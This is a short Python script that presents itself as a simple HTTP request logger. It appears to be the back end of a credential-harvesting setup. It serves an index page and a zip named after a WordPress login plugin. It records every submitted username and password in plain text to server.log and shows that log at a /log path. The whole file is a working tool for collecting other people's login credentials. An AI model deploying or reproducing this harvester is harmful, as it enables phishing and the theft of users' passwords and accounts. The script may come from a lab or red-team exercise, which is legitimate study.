#!/usr/bin/env python3
"""
Very simple HTTP server in python for logging requests
Usage::
    ./server.py [<port>]
"""
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse
from urllib.parse import parse_qs
from datetime import datetime
import logging

class S(BaseHTTPRequestHandler):

    def _set_response(self, status, contenttype):
        self.send_response(status)
        self.send_header('Content-type', contenttype)
        self.end_headers()

    def do_GET(self):
    
        #logging.info("GET request,\nPath: %s\nHeaders:\n%s\n", str(self.path), str(self.headers))
        
        if self.path.lower() == "/login-lockdown.1.8.2.zip":
                f = open("login-lockdown.1.8.2.zip", "rb")
                l = f.read()
                f.close()
                self._set_response(200, 'application/zip')
                self.wfile.write(l)
        elif self.path.lower() == "/log":
                f = open("server.log", "r")
                l = f.read().replace("\n", "<br>")
                f.close()
                self._set_response(200, 'text/html')
                self.wfile.write(l.encode('utf-8'))
        else:
                f = open("index.html", "r")
                l = f.read()
                f.close()
                self._set_response(200, 'text/html')
                self.wfile.write(l.encode('utf-8'))

    def do_POST(self):
        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
        post_data = self.rfile.read(content_length) # <--- Gets the data itself
        #logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n", str(self.path), str(self.headers), post_data.decode('utf-8'))

        parsed_url = urlparse("/?" + post_data.decode('utf-8'))
        username = parse_qs(parsed_url.query)['username'][0]
        password = parse_qs(parsed_url.query)['password'][0]

        f = open("server.log", "a")
        f.write(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " username = " + username + ", password = " + password + "\n")
        f.close()

        self._set_response(200, 'text/html')
        self.wfile.write("POST request for {}".format(self.path).encode('utf-8'))

def run(server_class=HTTPServer, handler_class=S, port=10000):
    logging.basicConfig(level=logging.INFO)
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    logging.info('Starting httpd...\n')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    logging.info('Stopping httpd...\n')

if __name__ == '__main__':
    from sys import argv

    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()

